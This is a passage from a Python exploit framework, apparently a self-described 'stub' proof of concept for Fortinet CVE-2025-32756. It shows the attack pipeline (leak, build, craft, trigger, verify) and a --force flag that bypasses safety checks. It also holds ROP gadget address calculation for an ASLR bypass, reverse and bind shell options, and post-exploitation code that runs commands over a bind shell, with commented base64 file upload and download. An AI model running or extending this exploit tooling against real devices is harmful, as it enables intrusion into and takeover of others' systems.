        # This log is redundant with the check in main, but kept for clarity
        if self.args.dry_run:
             logger.warning("[post-exp] Dry-run mode: Skipping post-exploitation.")
             return # Should be skipped by main loop check, but redundant guard

        logger.info("[post-exp] Attempting post-exploitation actions...")
        post_exp_modules = self.cfg.get('post_exploitation', {}).get('modules', [])
        if not post_exp_modules:
            logger.info("[post-exp] No post-exploitation modules defined in config. Nothing to do.")
            return
        # Check if verification passed before running post-exploitation
        if not self._verified:
             # Main pipeline handles skipping based on _verified status, this log is redundant but kept for clarity
             logger.warning("[post-exp] Verification did not pass. Skipping post-exploitation.")
             return

        payload_type = self.cfg.get('payload', {}).get('type')
        shellcode_type = self.cfg.get('payload', {}).get('shellcode_options', {}).get('type')
        target_ip = self.cfg.get('target', {}).get('ip')
        post_exp_delay = self.cfg.get('timing', {}).get('delay_between_post_exp_modules', 1)
        le = self.cfg.get('target', {}).get('endianness') == 'little'
        # For stubs, assume a bind shell is available if payload was shellcode bind_shell and verification passed
        if payload_type == 'shellcode' and shellcode_type == 'bind_shell':
             shell_port = self.shellcode_options.get('port')
             if shell_port:
                 logger.info(f"[post-exp] Attempting to connect to bind shell at {target_ip}:{shell_port} for post-exploitation.")
                 shell = None # Initialize shell to None
                 try:
                     shell = pwntools_remote(target_ip, shell_port)
                     logger.success("[post-exp] Connected to shell. Running post-exploitation modules...")
                     for i, module in enumerate(post_exp_modules):
                         module_type = module.get('type')
                         # Use post_exp_delay here instead of fixing timeout in recvall for post-exp modules
                         delay = post_exp_delay # Delay applies to all modules
                         # time.sleep(delay) # moved below the module logic for consistent delay application

                         logger.info(f"[post-exp] Running module {i+1}: {module_type}")
                         if module_type == 'execute_command':
                             command = module.get('command')
                             if command:
                                 logger.info(f"[post-exp] Executing command: {command}")
                                 try:
                                     shell.sendline(command.encode() + b'\n') # Add newline to execute command
                                     # Read output (might need more robust logic depending on target shell)
                                     # time.sleep(post_exp_delay) # Removed, handled by recvall timeout
                                     output = shell.recvall(timeout=3) # Attempt to read all available output within timeout
                                     logger.info(f"[post-exp] Command output:\n---\n{output.decode(errors='ignore')}\n---")
                                 except EOFError:
                                     logger.warning("[post-exp] Shell connection closed prematurely during command execution.")
                                     break # Exit the module loop if shell closes
                                 except Exception as e:
                                     logger.error(f"[post-exp] Error executing command: {e}")
                             else:
                                 logger.warning("[post-exp] 'execute_command' module missing 'command'. Skipping.")
                         elif module_type == 'upload_file':
                             local_path = module.get('local_path')
                             remote_path = module.get('remote_path')
                             if local_path and remote_path:
                                 logger.info(f"[post-exp] Uploading '{local_path}' to '{remote_path}'...")
                                 # This requires the target shell supports upload (e.g. via base64 or echoing)
                                 # This is a complex topic, for a stub we'll just log
                                 logger.warning("[post-exp] File upload not implemented in stub.")
                                 # Example of how you might do it if you had a specific target primitive:
                                 # try:
                                 #     with open(local_path, 'rb') as f:
                                 #         file_content = f.read()
                                 #     encoded_content = base64.b64encode(file_content).decode()
                                 #     upload_cmd = f"echo '{encoded_content}' | base64 -d > {remote_path}"
                                 #     shell.sendline(upload_cmd.encode())
                                 #     time.sleep(post_exp_delay)
                                 #     # Check for errors?
                                 #     logger.success("[post-exp] File upload command sent (check target).")
                                 # except Exception as e:
                                 #      logger.error(f"[post-exp] Error during file upload prep: {e}")
                             else:
                                 logger.warning("[post-exp] 'upload_file' module requires 'local_path' and 'remote_path'. Skipping.")
                         elif module_type == 'download_file':
                             local_path = module.get('local_path')
                             remote_path = module.get('remote_path')
                             if local_path and remote_path:
                                  logger.info(f"[post-exp] Downloading '{remote_path}' to '{local_path}'...")
                                  # Requires target shell supports download (e.g. via cat/echo + base64)
                                  logger.warning("[post-exp] File download not implemented in stub.")
                                  # Example:
                                  # try:
                                  #     download_cmd = f"base64 {remote_path}"
                                  #     shell.sendline(download_cmd.encode())
                                  #     time.sleep(post_exp_delay)
                                  #     encoded_output = shell.recvuntil(b'\n', timeout=5) # Need robust reading logic
                                  #     file_content = base64.urlsafe_b64decode(encoded_output.strip()) # Use urlsafe if possible
                                  #      with open(local_path, 'wb') as f:
                                  #          f.write(file_content)
                                  #      logger.success(f"[post-exp] File downloaded to '{local_path}'.")
                                  # except Exception as e:
                                  #       logger.error(f"[post-exp] Error during file download: {e}")
                             else:
                                 logger.warning("[post-exp] 'download_file' module requires 'local_path' and 'remote_path'. Skipping.")
                         else:
                             logger.warning(f"[post-exp] Unsupported post-exploitation module type: {module_type}. Skipping.")
                         time.sleep(post_exp_delay) # Add delay after each module is attempted


                     logger.info("[post-exp] Post-exploitation modules finished.")
                 except Exception as e:
                     logger.error(f"[post-exp] Failed to connect to shell for post-exploitation or error during module execution: {e}")
                 finally:
                     if shell:
                         shell.close() # Ensure shell is closed even on exception

             else:
                  logger.warning("[post-exp] Payload type is bind_shell but shell port is not defined in config. Cannot connect.")
        else:
            # Main pipeline logic determines if post-exp runs, this log should be more informative
            # Include the outcome of verification here for clarity in logs
            if self._verified:
                 logger.info("[post-exp] Post-exploitation skipped (payload type is not bind_shell).")
            else:
                 # Already logged verification failure, this is just confirming post-exp skipped
                 # No need for additional log here, verification failure message is sufficient
                 pass

    def update_dependent_addresses(self) -> None:
        """Populates address dictionaries based on base addresses and offsets."""
        logger.info("[update_addresses] Populating addresses based on base addresses and static offsets...")

        log_warned_bases: set[str] = set()  # Track warnings to avoid repetition. Declare before conditional branches.

        # Determine source bases: fixed if ASLR off, calculated/leaked if ASLR on
        source_bases = self.fixed_base_addresses # Start with fixed bases

        # If ASLR is on, use calculated bases instead
        if self.use_aslr_bypass:
             if not self.calculated_base_addresses:
                 # This should have been caught by validation/leak_info, but as a fallback
                 logger.error("[update_addresses] ASLR bypass is on, but calculated base addresses are not populated. Cannot update dependent addresses.")
                 return # Cannot proceed if bases is missing when ASLR is on

             source_bases = self.calculated_base_addresses # Use leaked/calculated bases if ASLR is on
             # Clear ALL derived addresses and *module* gadgets IF ASLR is on, as they must come from leaked bases
             # Flat gadgets from rop.gadgets are NOT cleared here, they are kept in __init__ and added below
             self.all_addresses = {}


        # Populate gadgets from module_gadget_offsets + bases. These add/overwrite items in self.all_gadgets based on module base + offset.
        # If ASLR is on, module offsets *overwrite* any flat rop.gadgets loaded in __init__ if they have the same key (_addr_key).
        # If ASLR is OFF, module offsets *add* to the flat rop.gadgets defined in __init__
        if 'module_gadget_offsets' in self.cfg.get('rop', {}):
            logger.info("[update_addresses] Adding gadget addresses from module_gadget_offsets...")
            for module_name, gadgets in self.cfg['rop']['module_gadget_offsets'].items():
                base_addr = source_bases.get(module_name, 0)
                if base_addr != 0:
                    for gadget_name, offset in gadgets.items():
                         try:
                            gadget_key = _addr_key(module_name, gadget_name)
                            if gadget_key in self.all_gadgets:
                                logger.warning(f"[update_addresses] Overwriting existing gadget key '{gadget_key}'.")
                            self.all_gadgets[gadget_key] = base_addr + offset
                            logger.debug(f"[update_addresses] Added gadget '{gadget_key}': {hex(self.all_gadgets[gadget_key])}")
                         except Exception as e: # Catch potential errors during key creation/addition
                             logger.error(f"[update_addresses] Error adding gadget '{gadget_name}' from module '{module_name}': {e}", exc_info=True)

                else: # Log when base is missing for module gadgets
                    if module_name not in log_warned_bases:
                         logger.warning(f"[update_addresses] Base address for module '{module_name}' is 0. Cannot calculate gadget addresses from offsets for this module.")
                         log_warned_bases.add(module_name)


        # Populate important addresses from module_offsets + bases
        if 'module_offsets' in self.cfg.get('addresses', {}): # Use get with default
            logger.info("[update_addresses] Adding important addresses from module_offsets...")
            for module_name, addresses in self.cfg['addresses']['module_offsets'].items():
                base_addr = source_bases.get(module_name, 0)
                if base_addr != 0:
                    for address_name, offset in addresses.items():
                         try:
                            address_key = _addr_key(module_name, address_name)
                            if address_key in self.all_addresses:
                                logger.warning(
                                    f"[update_addresses] Overwriting existing address key '{address_key}'."
                                )
                            self.all_addresses[address_key] = base_addr + offset
                            logger.debug(f"[update_addresses] Added address '{address_key}': {hex(self.all_addresses[address_key])}")
                         except Exception as e: # Catch potential errors during key creation/addition
                             logger.error(f"[update_addresses] Error adding address '{address_name}' from module '{module_name}': {e}", exc_info=True)

                elif module_name not in log_warned_bases:
                    # Warning already logged for gadgets, no need to repeat for the same module base missing
                    if module_name not in log_warned_bases:
                         logger.warning(
                             f"[update_addresses] Base address for module '{module_name}' is 0. Cannot calculate addresses from offsets for this module."
                         )
                         log_warned_bases.add(module_name)

        logger.info("[update_addresses] Address population complete.")
        logger.debug(f"Current all_gadgets: {self.all_gadgets}")
        logger.debug(f"Current all_addresses: {self.all_addresses}")

        return
 # Placeholder for main execution block
if __name__ == "__main__":
    # Configure logging here after importing logging
    # Set default level to INFO
    # Removed basicConfig here. Moved to main() after parsing CLI args.
    # pass # Removed unused pass

    parser = argparse.ArgumentParser(
        description="Fortinet CVE-2025-32756 Reproducible PoC Framework - Stub",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example usage:
  python3 forti_poc.py -c my_config.json --dry-run --log-level debug
  python3 forti_poc.py -c my_config.json --force --log-level info
  python3 forti_poc.py                                # Exits 1 if neither --force nor --dry-run are used
""" # Added example usage to help
    )
    parser.add_argument(
        "-c",
        "--config",
        metavar="FILE",
        default=DEFAULT_CONFIG_FILE,
        help=f"Path to the JSON configuration file (default: {DEFAULT_CONFIG_FILE})",
    )
    parser.add_argument(
        "--lhost", metavar="IP", help="Local IP for reverse shells (required for reverse_shell payload)"
    )
    parser.add_argument(
        "--lport", metavar="PORT", type=int, help="Local port for reverse/bind shells (required for shellcode payloads)"
    )
    # Add mutually exclusive group for --force and --dry-run to prevent combining them
    group = parser.add_mutually_exclusive_group()
    group.add_argument(
        "--force", action="store_true", help="Bypass safety checks and attempt exploit triggering"
    )
    group.add_argument(
        "--dry-run", action="store_true", help="Build and craft payload only, no triggering or verification."
    )

    # Add logging level argument
    parser.add_argument(
        "--log-level",
        choices=["debug", "info", "warning", "error", "critical", "notset"],
        default="info", # Default info
        help="Set script's logging level (default: info)",
    )
    args = parser.parse_args()

    # Configure logging after parsing CLI args
    log_level_int = getattr(logging, args.log_level.upper(), logging.INFO)
    logging.basicConfig(level=log_level_int, format='%(levelname)s:%(name)s:%(message)s')

    # Set level for the custom logger instance and pwntools logger
    logger.setLevel(log_level_int)
    logging.getLogger('pwn').setLevel(log_level_int)

    # For handlers created by basicConfig, their level might still be the default INFO.
    # Iterate and set level for handlers if needed to show lower level messages.
    for handler in logging.root.handlers:
        handler.setLevel(log_level_int) # Set handler level

    # Try loading the default reference config if the specified config file doesn't exist
    # This makes the `--write-config` argument more useful
    config = load_config(args.config)
    if config is None and args.config == DEFAULT_CONFIG_FILE:
        logger.info(f"Default config file '{DEFAULT_CONFIG_FILE}' not found. Writing a reference config to this location.")
        try:
            with open(DEFAULT_CONFIG_FILE, 'w', encoding='utf-8') as f:
                # Use json.dump with indent for readability, it handles commas correctly
                # Ensure the JSON content is valid JSON before dumping
                json_content = json.loads(REPRODUCER_CONFIG_CONTENT) # parse valid JSON object
                json.dump(json_content, f, indent=2)
            logger.success(f"Wrote reference config to '{DEFAULT_CONFIG_FILE}'. Please review and modify it.")
            # Reload the newly written config
            config = load_config(args.config)
        except IOError as e:
             logger.critical(f"Failed to write reference config to '{DEFAULT_CONFIG_FILE}': {e}")
             sys.exit(1)
        except json.JSONDecodeError as e: # Catch errors if REPRODUCER_CONFIG_CONTENT is bad JSON initially
             logger.critical(f"Internal error: REPRODUCER_CONFIG_CONTENT is invalid JSON: {e}")
             sys.exit(1)


    elif config is None:
        # If a specific config file was requested but not found/invalid, exit after load_config error
        sys.exit(1)

    # --- Main Pipeline ---
    try: # Wrap the core pipeline in a try/except for custom ExploitErrors
        # Pass args to the FortiExploiter class
        exploit = FortiExploiter(config, args)

        # Check for required options based on payload type before starting pipeline
        payload_type = config.get('payload', {}).get('type')
        shellcode_options = config.get('payload', {}).get('shellcode_options', {})
        shellcode_type = shellcode_options.get('type')

        if payload_type == 'shellcode':
            if shellcode_type == 'reverse_shell' and not exploit.lhost:
                logger.critical("LHOST is required for reverse_shell payload. Please provide with --lhost.")
                raise ExploitError("Missing LHOST for reverse shell.") # Raise custom error
            if shellcode_type in ['reverse_shell', 'bind_shell'] and not exploit.lport:
                logger.critical(f"LPORT is required for {shellcode_type} payload. Please provide with --lport.")
                raise ExploitError(f"Missing LPORT for {shellcode_type}.") # Raise custom error

        logger.info("Starting exploit pipeline...")

        # The trigger_vulnerability method now handles the --force / --dry-run logic internally
        # We check args.dry_run here only to display the initial warning line
        if exploit.args.dry_run:
            logger.warning("Running in dry-run mode: build, craft, and verify only. No actual trigger sent.")


        if not exploit.leak_info():
            logger.critical("Exploit failed during information leakage stage.")
            raise ExploitError("Information leakage failed.") # Raise custom error

        # After successful leakage (if configured), update dependent addresses (gadgets based on leaked bases)
        # This call is inside leak_info if bypass is off, but needs to be here if bypass is on and leak succeeded
        # Exploit.leak_info() WILL NEED to return True AND populate calculated_base_addresses if ASLR bypass is on
        if exploit.use_aslr_bypass and not exploit.all_addresses: # Check if ASLR is on and addresses haven't been populated by leak_info
             logger.info("Attempting to update dependent addresses based on (stub) leakage results...")
             exploit.update_dependent_addresses()
             # If addresses are still missing after update, and ROP/DEP bypass is needed, this will fail later in build_exploit_code
             if exploit.use_dep_nx_bypass and exploit.cfg.get('mitigations', {}).get('dep_nx', {}).get('method') == 'rop' and (not exploit.all_gadgets and not exploit.all_addresses): # Both might be needed for ROP
                  logger.critical("ROP payload requires gadgets and addresses, but they were not populated after leakage. Check leak_info implementation and config offsets.")
                  raise ExploitError("ROP address population failed after leakage.") # Raise custom error


        exploit_code = exploit.build_exploit_code()
        if exploit_code is None:
            logger.critical("Exploit failed during exploit code building stage.")
            # build_exploit_code already logs specific error, no need to add detail here
            raise ExploitError("Exploit code building failed.") # Raise custom error


        exploit_payload = exploit.craft_exploit_payload(exploit_code)
        if exploit_payload is None:
            logger.critical("Exploit failed during payload crafting stage.")
            # craft_exploit_payload already logs specific error, no need to add detail here
            raise ExploitError("Payload crafting failed.") # Raise custom error

        # triggering_vulnerability method now contains the dry-run check internally
        if not exploit.trigger_vulnerability(exploit_payload):
            logger.critical("Exploit failed during vulnerability triggering stage.")
            # trigger_vulnerability logs specific error, no need to add detail here
            # Exit 1 is handled at the end if _qualified is False and not dry-run
            # Raise custom error here to ensure consistent flow
            raise ExploitError("Vulnerability triggering failed.")


        # Optional verification step - skipped in dry-run by verify_exploit_success internal logic
        verification_configured = config.get('verification', {}).get('methods')
        exploit_verified = True # Assume True if no verification is configured

        if verification_configured:
            logger.info("Attempting to verify exploit success...")
            # The verify_exploit_success method handles the dry-run check internally now
            exploit_verified = exploit.verify_exploit_success()
            exploit._verified = exploit_verified # Store verification result
            if not exploit_verified:
                logger.warning("Exploit verification failed.")
                # Only raise ExploitError if verification failed AND not in dry-run mode
                if not exploit.args.dry_run:
                     raise ExploitError("Exploit verification failed.")

            else:
                logger.success("Exploit verification successful.") # Changed log level to success as pipeline is successful so far

            # Delay after optional verification before post-exploitation
            # Added check for dry-run here as hand()le_post_exploitation is skipped
            if not exploit.args.dry_run:
                 time.sleep(config.get('timing', {}).get('delay_between_verification', 1))
        else:
            logger.info("No verification methods configured. Skipping verification.")

        # Optional post-exploitation step - run only if verification passed (or no verification configured) AND not in dry-run
        if config.get('post_exploitation', {}).get('modules') and exploit_verified and not exploit.args.dry_run:
            logger.info("Attempting post-exploitation actions...")
            exploit.handle_post_exploitation()
        elif exploit.args.dry_run and config.get('post_exploitation', {}).get('modules'):
             logger.info("Post-exploitation modules skipped in dry-run mode.")
        else:
             # Log skipping reason for clarity even if no modules are configured
             if not config.get('post_exploitation', {}).get('modules'):
                  logger.info("No post-exploitation modules configured. Skipping post-exploitation.")
             elif not exploit._verified and verification_configured and not exploit.args.dry_run:
                 # Log skipping post-exp due to verification failure (and verification was configured)
                 logger.info("Skipping post-exploitation because verification failed.")
             else: # No modules and no verification configured, or other skip reason not yet logged
                 # This case might indicate no modules configured AND no verification configured
                 # Or cases where _verified is True but module list is empty
                 pass # No explicit action needed, previous logs cover it

        # Final pipeline status log
        # The try/except block finishes the pipeline and handles exits based on ExploitError
        # This final log indicates pipeline completion without errors.
        if exploit.args.dry_run:
            # Check if payload was crafted successfully (should be true if we reached here)
            if exploit_payload is not None:
                 logger.success("Dry-run finished successfully; payload size %s bytes." % len(exploit_payload)) # Distinct message for successful dry run, include payload size
            else:
                 # This case should not be reached if payload crafting failed, but just in case
                 logger.error("[main] Internal error: Dry-run finished but payload crafting failed.")
                 sys.exit(1)

        elif exploit._verified: # Verification was configured and passed
             logger.success("Exploit pipeline finished successfully.")

        elif verification_configured: # Verification was configured but failed AND not dry-run
             # Exit 1 was handled by the raise ExploitError above if verification failed and not dry-run
             logger.warning("Exploit pipeline finished, but verification failed.")
             pass # No explicit exit here, the catch block will handle it

        else: # No verification configured, pipeline completed without fatal build/craft/trigger errors (and not dry-run)
             logger.info("Exploit pipeline finished.")


    except ExploitError as e: # Catch custom ExploitErrors
        # The specific log message is in the raised exception. We just need to indicate failure here.
        logger.critical("Exploit pipeline aborted.")
        sys.exit(1) # Exit with error code 1 for controlled failures
    except Exception as e: # Catch any unexpected errors during pipeline
        logger.critical(f"An unexpected error occurred during exploit pipeline execution: {e}", exc_info=True)
        sys.exit(1) # Exit with error code 1 for unexpected exceptions

    # Final exit with code 0 for successful execution path (controlled exits happen in the try/except)
    # All failure paths for non-dry-run should raise ExploitError or exit 1 directly now
    # So, if we reach this point without an exception, it's likely a successful non-dry-run
    # or a successful dry-run (which exits early).
    # The final exit code logic is simplified to rely on the exception handling.
    # sys.exit(0) # Redundant due to try/except and early dry-run exit
